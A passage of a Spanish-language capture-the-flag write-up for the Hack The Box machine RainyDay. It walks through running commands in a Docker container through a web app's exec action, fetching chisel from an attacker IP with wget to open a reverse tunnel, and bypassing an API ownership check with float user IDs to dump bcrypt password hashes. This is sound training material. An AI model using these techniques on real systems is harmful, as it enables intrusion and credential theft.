+<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">xhr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">XMLHttpRequest</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk1">xhr</span><span class="mtk1">.</span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"POST"</span><span class="mtk1">, </span><span class="mtk4">"/containers"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk1">xhr</span><span class="mtk1">.</span><span class="mtk8">setRequestHeader</span><span class="mtk1">(</span><span class="mtk4">'Content-type'</span><span class="mtk1">, </span><span class="mtk4">'application/x-www-form-urlencoded'</span><span class="mtk1">);</span>
+<span class="mtk1">    data </span><span class="mtk5">=</span><span class="mtk1"> {</span>
+<span class="mtk1">        </span><span class="mtk4">"action"</span><span class="mtk1">: </span><span class="mtk9 mtki">action_name</span><span class="mtk1">,</span>
+<span class="mtk1">        </span><span class="mtk4">"id"</span><span class="mtk1">: </span><span class="mtk9 mtki">container_id</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">action_name</span><span class="mtk1"> </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">"logs"</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk9 mtki">action_name</span><span class="mtk1">.</span><span class="mtk8">startsWith</span><span class="mtk1">(</span><span class="mtk4">"exec"</span><span class="mtk1">)) {</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">action_name</span><span class="mtk1">.</span><span class="mtk8">startsWith</span><span class="mtk1">(</span><span class="mtk4">"exec"</span><span class="mtk1">))</span>
+<span class="mtk1">        {</span>
+<span class="mtk1">            data[</span><span class="mtk4">'action'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">action_name</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7">prompt</span><span class="mtk1">(</span><span class="mtk4">"Enter Command: "</span><span class="mtk1">)</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">        </span><span class="mtk1">xhr</span><span class="mtk1">.</span><span class="mtk1">responseType</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'blob'</span><span class="mtk1">;</span>
+<span class="mtk1">        </span><span class="mtk1">xhr</span><span class="mtk1">.</span><span class="mtk8">onload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> (</span><span class="mtk9 mtki">e</span><span class="mtk1">) {</span>
+<span class="mtk1">            </span><span class="mtk7 mtki">var</span><span class="mtk1"> </span><span class="mtk1">blob</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">e</span><span class="mtk1">.</span><span class="mtk7">currentTarget</span><span class="mtk1">.response;</span>
+<span class="mtk1">            </span><span class="mtk7 mtki">var</span><span class="mtk1"> </span><span class="mtk1">contentDispo</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">e</span><span class="mtk1">.</span><span class="mtk7">currentTarget</span><span class="mtk1">.</span><span class="mtk8">getResponseHeader</span><span class="mtk1">(</span><span class="mtk4">'Content-Disposition'</span><span class="mtk1">);</span>
+<span class="mtk1">            </span><span class="mtk3">// </span><span class="mtk3 detected-link">https://stackoverflow.com/a/23054920/</span>
+<span class="mtk1">            </span><span class="mtk7 mtki">var</span><span class="mtk1"> </span><span class="mtk1">fileName</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">contentDispo</span><span class="mtk1">.</span><span class="mtk8">match</span><span class="mtk1">(</span><span class="mtk4">/filename</span><span class="mtk6">[</span><span class="mtk5">^</span><span class="mtk6">;=\n]</span><span class="mtk5">*</span><span class="mtk4">=((</span><span class="mtk6">['"]</span><span class="mtk4">)</span><span class="mtk6">.</span><span class="mtk5">*?\2|</span><span class="mtk6">[</span><span class="mtk5">^</span><span class="mtk6">;\n]</span><span class="mtk5">*</span><span class="mtk4">)/</span><span class="mtk1">)[</span><span class="mtk6">1</span><span class="mtk1">];</span>  
+<span class="mtk1">            </span><span class="mtk8">saveBlob</span><span class="mtk1">(</span><span class="mtk1">blob</span><span class="mtk1">, </span><span class="mtk1">fileName</span><span class="mtk1">);</span>
+<span class="mtk1">            </span><span class="mtk9 mtki">ctx</span><span class="mtk1">.disabled </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
+<span class="mtk1">            </span><span class="mtk1">location</span><span class="mtk1">.</span><span class="mtk8">reload</span><span class="mtk1">();</span>
+<span class="mtk1">        }</span>
+
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk5">else</span><span class="mtk1"> </span>
+<span class="mtk1">    {</span>
+<span class="mtk1">        </span><span class="mtk1">xhr</span><span class="mtk1">.</span><span class="mtk8">onload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">function</span><span class="mtk1"> (</span><span class="mtk9 mtki">e</span><span class="mtk1">) {</span>
+<span class="mtk1">            </span><span class="mtk9 mtki">ctx</span><span class="mtk1">.disabled </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
+<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">action_name</span><span class="mtk1">.</span><span class="mtk8">startsWith</span><span class="mtk1">(</span><span class="mtk4">"create"</span><span class="mtk1">))</span>
+<span class="mtk1">            {</span>
+<span class="mtk1">                </span><span class="mtk1">location</span><span class="mtk1">.</span><span class="mtk1">href</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"/containers"</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">            </span><span class="mtk5">else</span>
+<span class="mtk1">            {</span>
+<span class="mtk1">                </span><span class="mtk1">location</span><span class="mtk1">.</span><span class="mtk8">reload</span><span class="mtk1">();</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">    </span><span class="mtk1">xhr</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">URLSearchParams</span><span class="mtk1">(data).</span><span class="mtk8">toString</span><span class="mtk1">())</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Básicamente, podemos interactuar con los contenedores usando un <code>id</code> y una <code>action</code>. También encontramos otro mensaje de depuración.</p><p>Como tenemos acceso como <code>gary</code>, podemos echar un vistazo a <code>/containers</code>:</p><p><img src="/images/HTB/RainyDay/RainyDay-7.png" alt="RainyDay 7"></p><p>Vamos a crear un contenedor <code>alpine</code> llamado <code>test</code>:</p><p><img src="/images/HTB/RainyDay/RainyDay-8.png" alt="RainyDay 8"></p><p><img src="/images/HTB/RainyDay/RainyDay-9.png" alt="RainyDay 9"></p><p>En el código HTML de la página vemos la interacción con JavaScript usando acciones <code>stop</code>, <code>exec</code>, <code>execdetach</code> y <code>logs</code>. Además, tenemos el <code>id</code> del contenedor:</p><p><img src="/images/HTB/RainyDay/RainyDay-10.png" alt="RainyDay 10"></p><p>Por otro lado, podemos confirmar que la tecnología usada es Flask, ya que tenemos una <em>cookie</em> de sesión típica de Flask:</p><p><img src="/images/HTB/RainyDay/RainyDay-11.png" alt="RainyDay 10"></p><p>En esta <em>cookie</em> aparece nuestro nombre de usuario:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">flask-unsign</span> -d -c eyJ1c2VybmFtZSI6ImdhcnkifQ.Y0tEKA.96Pgi_pmEs4SXG4CSpq_wvAQ31w  
+{'username': 'gary'}
+</code></pre></div><p>Desafortunadamente, la clave secreta que firma las <em>cookies</em> no se encuentra en <code>rockyou.txt</code> y no se puede extraer con <a href="https://pypi.org/project/flask-unsign/"><code>flask-unsign</code></a>.</p><h3 id="enumeración-del-contenedor">Enumeración del contenedor</h3><p>Vamos a probar a ejecutar comandos desde el contenedor de Docker:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> cookie=eyJ1c2VybmFtZSI6ImdhcnkifQ.Y0tEKA.96Pgi_pmEs4SXG4CSpq_wvAQ31w
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/containers --data-urlencode <span class="code-dark-yellow">"action=execls"</span> -d <span class="code-dark-yellow">'id=b420a98bd8eafcb1f35e5d91258172caa51db54a60f0e8262086e3ca5f357188'</span> -H <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span>  
+bin
+dev
+etc
+home
+lib
+logfile
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+</code></pre></div><p>Podemos envolver el comando anterior en una función para poder trabajar mejor:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">function</span> exec_cmd<span class="code-dark-yellow">()</span> <span class="code-dark-yellow">{</span> <span class="code-dark-green">curl</span> rainycloud.htb/containers --data-urlencode <span class="code-dark-yellow">"action=exec<span class="code-dark-cyan">$1</span>"</span> -sd <span class="code-dark-yellow">'id=b420a98bd8eafcb1f35e5d91258172caa51db54a60f0e8262086e3ca5f357188'</span> -H <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>" }</span>  
+
+<span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'ls -la'</span>
+total 64
+drwxr-xr-x    1 root     root          4096 Oct 15 23:40 .
+drwxr-xr-x    1 root     root          4096 Oct 15 23:40 ..
+-rwxr-xr-x    1 root     root             0 Oct 15 23:40 .dockerenv
+drwxr-xr-x    2 root     root          4096 Sep 29 13:47 bin
+drwxr-xr-x   15 root     root          3860 Oct 15 23:40 dev
+drwxr-xr-x    1 root     root          4096 Oct 15 23:40 etc
+drwxr-xr-x    2 root     root          4096 Sep 29 13:47 home
+drwxr-xr-x    7 root     root          4096 Sep 29 13:47 lib
+-rwxrwxrwx    1 root     root             0 Oct 15 23:40 logfile
+drwxr-xr-x    5 root     root          4096 Sep 29 13:47 media
+drwxr-xr-x    2 root     root          4096 Sep 29 13:47 mnt
+drwxr-xr-x    2 root     root          4096 Sep 29 13:47 opt
+dr-xr-xr-x  287 root     root             0 Oct 15 23:40 proc
+drwx------    2 root     root          4096 Sep 29 13:47 root
+drwxr-xr-x    2 root     root          4096 Sep 29 13:47 run
+drwxr-xr-x    2 root     root          4096 Sep 29 13:47 sbin
+drwxr-xr-x    2 root     root          4096 Sep 29 13:47 srv
+dr-xr-xr-x   13 root     root             0 Oct 15 23:40 sys
+drwxrwxrwt    2 root     root          4096 Sep 29 13:47 tmp
+drwxr-xr-x    7 root     root          4096 Sep 29 13:47 usr
+drwxr-xr-x   12 root     root          4096 Sep 29 13:47 var
+</code></pre></div><p>Enumeramos procesos en ejecución así:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'ps -a'</span>
+PID   USER     TIME  COMMAND
+    1 root      0:04 {systemd} /sbin/init
+    2 root      0:00 [kthreadd]
+
+...
+
+  453 root      0:01 [jbd2/dm-0-8]
+  454 root      0:00 [ext4-rsv-conver]
+  514 root      1:39 /lib/systemd/systemd-journald
+  545 root      0:00 [ipmi-msghandler]
+  551 root      0:00 [kaluad]
+  552 root      0:00 [kmpath_rdacd]
+  554 root      0:00 [kmpathd]
+  556 root      0:00 [kmpath_handlerd]
+  558 root      0:08 /sbin/multipathd -d -s
+  560 root      0:00 /lib/systemd/systemd-udevd
+  579 101       0:01 /lib/systemd/systemd-networkd
+  653 root      0:00 [nfit]
+  748 root      0:00 [jbd2/sda2-8]
+  749 root      0:00 [ext4-rsv-conver]
+  763 102       0:10 /lib/systemd/systemd-resolved
+  764 104       0:03 /lib/systemd/systemd-timesyncd
+  783 root      0:00 /usr/bin/VGAuthService
+  786 root      1:34 /usr/bin/vmtoolsd
+  809 root      0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
+  853 103       0:00 {dbus-daemon} @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+  858 root      0:03 /usr/sbin/irqbalance --foreground
+  861 root      0:00 {networkd-dispat} /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+  862 root      0:00 /usr/libexec/polkitd --no-debug
+  863 107       0:50 /usr/sbin/rsyslogd -n -iNONE
+  864 root      0:04 /usr/lib/snapd/snapd
+  865 root      0:00 /lib/systemd/systemd-logind
+  866 root      0:00 /usr/libexec/udisks2/udisksd
+  886 root      0:00 /usr/sbin/ModemManager
+ 1189 root      0:00 /usr/sbin/cron -f -P
+ 1190 1000      0:00 sleep 100000000
+ 1203 root      1:08 /usr/bin/containerd
+ 1214 root      0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+ 1220 root      0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+ 1237 root      0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
+ 1238 xfs       2:52 nginx: worker process
+ 1239 xfs       3:23 nginx: worker process
+ 1255 root      0:28 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+ 1473 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 49153 -container-ip 172.18.0.2 -container-port 40001
+ 1478 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 49153 -container-ip 172.18.0.2 -container-port 40001
+ 1492 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 40000 -container-ip 172.18.0.2 -container-port 40000
+ 1498 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 40000 -container-ip 172.18.0.2 -container-port 40000
+ 1514 root      0:10 /usr/bin/containerd-shim-runc-v2 -namespace moby -id c0fe876cc336487fb0bf8e28e08538a6dff303eb21ce58051015fb1eec4dded8 -address /run/containerd/containerd.sock  
+ 1536 root      0:03 tail -f /logfile
+ 1610 1001      1h02 /usr/local/bin/uwsgi --ini rainycloud.ini --threads 10
+ 4165 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 40001 -container-ip 172.18.0.3 -container-port 40001
+ 4171 root      0:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 40001 -container-ip 172.18.0.3 -container-port 40001
+ 4197 root      0:11 /usr/bin/containerd-shim-runc-v2 -namespace moby -id b420a98bd8eafcb1f35e5d91258172caa51db54a60f0e8262086e3ca5f357188 -address /run/containerd/containerd.sock
+ 4230 root      0:02 tail -f /logfile
+15057 root      0:00 [kworker/u256:2-]
+15143 root      0:00 [kworker/0:1-eve]
+15146 root      0:00 [kworker/1:1-rcu]
+15180 root      0:00 [kworker/0:0-cgr]
+15197 root      0:00 [kworker/u256:0-]
+15206 root      0:00 [kworker/1:0-rcu]
+15262 root      0:00 [kworker/0:2]
+15263 root      0:00 [kworker/u256:1-]
+15274 root      0:00 [kworker/1:2-eve]
+15276 1337      0:00 ps -a
+15284 1337      0:00 timeout 5s ps -a
+</code></pre></div><p>Aquí tenemos algunas cosas interesantes:</p><ul><li><code>c0fe876cc336487fb0bf8e28e08538a6dff303eb21ce58051015fb1eec4dded8</code> es el <code>id</code> del contenedor de <code>jack</code> llamado <code>secrets</code>. Su dirección IP es <code>172.18.0.2</code></li><li>Hay algunos puertos abiertos en la máquina principal: 40000, 40001 y 49153. Tenemos conexión con la máquina desde <code>172.18.0.1</code></li><li>Nuestra dirección IP es <code>172.18.0.3</code></li><li>Un proceso de la máquina es <code>/usr/local/bin/uwsgi --ini rainycloud.ini --threads 10</code>, que ejecuta el servidor web en producción usando Flask</li></ul><p>No podemos conectarnos al otro contenedor:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/containers -d <span class="code-dark-yellow">'id=c0fe876cc336487fb0bf8e28e08538a6dff303eb21ce58051015fb1eec4dded8'</span> --data-urlencode <span class="code-dark-yellow">"action=execls"</span> -H <span class="code-dark-yellow">"Cookie: session=<span class="code-dark-cyan">$cookie</span>"</span>  
+Unauthorized
+</code></pre></div><h3 id="acceso-al-entorno-de-desarrollo">Acceso al entorno de desarrollo</h3><p>Tenemos que recordar que había un subdominio que bloqueaba nuestra dirección IP externa, pero ahora tenemos acceso desde el contenedor:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'wget -qO- --header="Host: dev.rainycloud.htb" 172.18.0.1'</span>
+&lt;!doctype html&gt;
+&lt;html lang="en"&gt;
+  ...
+  &lt;body&gt;
+
+    &lt;nav class="navbar navbar-expand-md navbar-light fixed-top bg-light"&gt;
+      &lt;a class="navbar-brand" href="/"&gt;RainyCloud&lt;/a&gt; &lt;img src="img/cloud-service.png"&gt;&lt;/img&gt;
+      ...
+    &lt;/nav&gt;
+
+    &lt;main role="main"&gt;
+
+      &lt;div class="jumbotron"&gt;
+        &lt;div class="container"&gt;
+          &lt;h1 class="display-3"&gt;Welcome to RainyCloud (Dev)!&lt;/h1&gt;
+          &lt;p&gt;Rainycloud is the simple hosting service that you need! Simply register and start a docker container at the click of a button!&lt;/p&gt;
+          WARNING: This tool is still in beta. The features coming in the next release include better command execution, better log viewing and an accessible and documented REST API.  
+        &lt;/div&gt;
+      &lt;/div&gt;
+
+      &lt;div class="container"&gt;
+        &lt;!-- Example row of columns --&gt;
+        &lt;div class="row"&gt;
+          &lt;div class="col-md-4"&gt;
+            &lt;h2&gt; Online Containers&lt;/h2&gt;
+            &lt;table class="table"&gt;
+                &lt;thead&gt;
+                    &lt;th scope="col"&gt;Container Name&lt;/th&gt;
+                    &lt;th scope="col"&gt;Image Name&lt;/th&gt;
+                    &lt;th scope="col"&gt;User&lt;/th&gt;
+                &lt;/thead&gt;
+                &lt;tbody&gt;
+
+                    &lt;tr&gt;
+                      &lt;td&gt;test&lt;/td&gt;
+                      &lt;td&gt;alpine:latest&lt;/td&gt;
+                      &lt;td&gt;gary&lt;/td&gt;
+                    &lt;/tr&gt;
+
+                    &lt;tr&gt;
+                      &lt;td&gt;secrets&lt;/td&gt;
+                      &lt;td&gt;alpine-python:latest&lt;/td&gt;
+                      &lt;td&gt;jack&lt;/td&gt;
+                    &lt;/tr&gt;
+
+                &lt;/tbody&gt;
+            &lt;/table&gt;
+          &lt;/div&gt;
+          &lt;div class="col-md-4"&gt;
+
+          &lt;/div&gt;
+          ...
+        &lt;/div&gt;
+
+        &lt;hr&gt;
+
+      &lt;/div&gt; &lt;!-- /container --&gt;
+
+    &lt;/main&gt;
+
+    &lt;footer class="container"&gt;
+      &lt;p&gt;&copy; Company 2017-2018&lt;/p&gt;
+    &lt;/footer&gt;
+
+    ...
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><p>Ahí está. En este punto, sería conveniente descargar <a href="https://github.com/jpillora/chisel"><code>chisel</code></a> en el contenedor y realizar un reenvío de puertos para ver la página web en el navegador. Al descargarlo, podemos ejecutarlo en segundo plano mediante el comando <code>execdetach</code> (podemos abusar de la función <code>exec_cmd</code> para eso):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'wget -qO /tmp/.chisel 10.10.14.43/chisel'</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'chmod +x /tmp/.chisel'</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">exec_cmd</span> <span class="code-dark-yellow">'detach/tmp/.chisel client 10.10.14.43:1234 R:80:172.18.0.1:80'</span>  
+Success
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:10.10.11.184 - - [] "GET /chisel HTTP/1.1" 200 -
+^C
+Keyboard interrupt received, exiting.
+
+<span class="code-cyan">$</span> <span class="code-dark-green">./chisel</span> server -p 1234 --reverse
+server: Reverse tunnelling enabled
+server: Fingerprint 2v6LdPLlcUWC6gh6Di2QZgYLGvH6Kfvr0RjMF5WYaR8=  
+server: Listening on http://0.0.0.0:1234
+server: session#1: tun: proxy#R:80=&gt;172.18.0.1:80: Listening
+</code></pre></div><p>Ahora tenemso que hacer que <code>dev.rainycloud.htb</code> apunte a <code>127.0.0.1</code> en <code>/etc/hosts</code>. Luego, tenemos esta web de desarrollo:</p><p><img src="/images/HTB/RainyDay/RainyDay-12.png" alt="RainyDay 12"></p><h3 id="enumeración-de-api">Enumeración de API</h3><p>Aquí hay varias pistas que apuntan a una API. Si añadimos una barra al final del comando de <code>ffuf</code>, veremos que hay otra ruta disponible:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://dev.rainycloud.htb/FUZZ/  
+<span class="code-dark-green">api                     [Status: 200, Size: 649, Words: 105, Lines: 24, Duration: 78ms]</span>
+<span class="code-dark-green">                        [Status: 200, Size: 4574, Words: 1172, Lines: 116, Duration: 79ms]</span>
+</code></pre></div><p>De hecho, también funciona en <code>rainycloud.htb</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/
+&lt;h1&gt; API v0.1 &lt;/h1&gt;
+Welcome to the RainyCloud dev API. This is UNFINISHED and should not be used without permission.
+&lt;table&gt;
+  &lt;tr&gt;
+    &lt;th&gt;Endpoint&lt;/th&gt;
+    &lt;th&gt;Description&lt;/th&gt;
+  &lt;/tr&gt;
+  &lt;tr&gt;
+    &lt;td&gt;&lt;pre&gt;/api/&lt;/pre&gt;&lt;/td&gt;
+    &lt;td&gt;This page&lt;/td&gt;
+  &lt;/tr&gt;
+  &lt;tr&gt;
+    &lt;td&gt;&lt;pre&gt;/api/list&lt;/pre&gt;&lt;/td&gt;
+    &lt;td&gt;Lists containers&lt;/td&gt;
+  &lt;/tr&gt;
+  &lt;tr&gt;
+    &lt;td&gt;&lt;pre&gt;/api/healthcheck&lt;/pre&gt;&lt;/td&gt;
+    &lt;td&gt;Checks the health of the website (path, type and pattern parameters only available internally)&lt;/td&gt;  
+  &lt;/tr&gt;
+  &lt;tr&gt;
+    &lt;td&gt;&lt;pre&gt;/api/user/&lt;id&gt;&lt;/pre&gt;&lt;/td&gt;
+    &lt;td&gt;Gets information about the given user. Can only view current user information&lt;/td&gt;
+  &lt;/tr&gt;
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/ -s | <span class="code-dark-green">md5sum</span>
+5caace956c65ddc00f3cd166d83a3327  -
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/ -s | <span class="code-dark-green">md5sum</span>
+5caace956c65ddc00f3cd166d83a3327  -
+</code></pre></div><p>Ahora podemos interactuar un poco con la API:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/list -s | <span class="code-dark-green">jq</span>
+<span class="code-white">{</span>
+  <span class="code-blue">"secrets"</span><span class="code-white">: {</span>
+    <span class="code-blue">"image"</span><span class="code-white">: </span><span class="code-dark-green">"alpine-python:latest"</span><span class="code-white">,</span>
+    <span class="code-blue">"user"</span><span class="code-white">: </span><span class="code-dark-green">"jack"</span>
+  <span class="code-white">},</span>
+  <span class="code-blue">"test"</span><span class="code-white">: {</span>
+    <span class="code-blue">"image"</span><span class="code-white">: </span><span class="code-dark-green">"alpine:latest"</span><span class="code-white">,</span>
+    <span class="code-blue">"user"</span><span class="code-white">: </span><span class="code-dark-green">"gary"</span>
+  <span class="code-white">}</span>
+<span class="code-white">}</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/healthcheck -s | <span class="code-dark-green">jq</span>
+<span class="code-white">{</span>
+  <span class="code-blue">"result"</span><span class="code-white">: </span>true<span class="code-white">,</span>
+  <span class="code-blue">"results"</span><span class="code-white">: []</span>
+<span class="code-white">}</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/user/0 -s | <span class="code-dark-green">jq</span>
+<span class="code-white">{}</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/user/1 -s | <span class="code-dark-green">jq</span>
+<span class="code-white">{</span>
+  <span class="code-blue">"Error"</span><span class="code-white">: <span class="code-dark-green">"Not allowed to view other users info!"</span>  
+<span class="code-white">}</span>
+</code></pre></div><p>Vemos que no podemos listar la información de otros usuarios. Pero podemos confundir al servidor usando valores en coma flotante para saltarnos la verificación:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/user/1.0 -s | <span class="code-dark-green">jq</span>
+<span class="code-white">{</span>
+  <span class="code-blue">"id"</span><span class="code-white">: </span>1<span class="code-white">,</span>
+  <span class="code-blue">"password"</span><span class="code-white">: </span><span class="code-dark-green">"$2a$10$bit.DrTClexd4.wVpTQYb.FpxdGFNPdsVX8fjFYknhDwSxNJh.O.O"</span><span class="code-white">,</span>  
+  <span class="code-blue">"username"</span><span class="code-white">: </span><span class="code-dark-green">"jack"</span>
+<span class="code-white">}</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/user/2.0 -s | <span class="code-dark-green">jq</span>
+<span class="code-white">{</span>
+  <span class="code-blue">"id"</span><span class="code-white">: </span>2<span class="code-white">,</span>
+  <span class="code-blue">"password"</span><span class="code-white">: </span><span class="code-dark-green">"$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W"</span><span class="code-white">,</span>
+  <span class="code-blue">"username"</span><span class="code-white">: </span><span class="code-dark-green">"root"</span>
+<span class="code-white">}</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/user/3.0 -s | <span class="code-dark-green">jq</span>
+<span class="code-white">{</span>
+  <span class="code-blue">"id"</span><span class="code-white">: </span>3<span class="code-white">,</span>
+  <span class="code-blue">"password"</span><span class="code-white">: </span><span class="code-dark-green">"$2b$12$WTik5.ucdomZhgsX6U/.meSgr14LcpWXsCA0KxldEw8kksUtDuAuG"</span><span class="code-white">,</span>
+  <span class="code-blue">"username"</span><span class="code-white">: </span><span class="code-dark-green">"gary"</span>
+<span class="code-white">}</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> rainycloud.htb/api/user/4.0 -s | <span class="code-dark-green">jq</span>
+<span class="code-white">{}</span>
+</code></pre></div><p>Aquí tenemos <em>hashes</em> de contraseñas (en formato <code>bcrypt</code>). Supongo que la vía intencionada de conseguir la contraseña de <code>gary</code> era rompiendo el <em>hash</em> con <code>john</code> o <code>hashcat</code>.</p><p>Vemos algunas diferencias en <code>dev.rainycloud.htb</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> dev.rainycloud.htb/api/healthcheck -s | <span class="code-dark-green">jq</span>
+<span class="code-white">{</span>
+  <span class="code-blue">"result"</span><span class="code-white">: </span>true<span class="code-white">,</span>
+  <span class="code-blue">"results"</span><span class="code-white">: [</span>
+<span class="code-white">    {</span>
+      <span class="code-blue">"file"</span><span class="code-white">: <span class="code-dark-green">"/bin/bash"</span><span class="code-white">,</span>
+      <span class="code-blue">"pattern"</span><span class="code-white">: {</span>
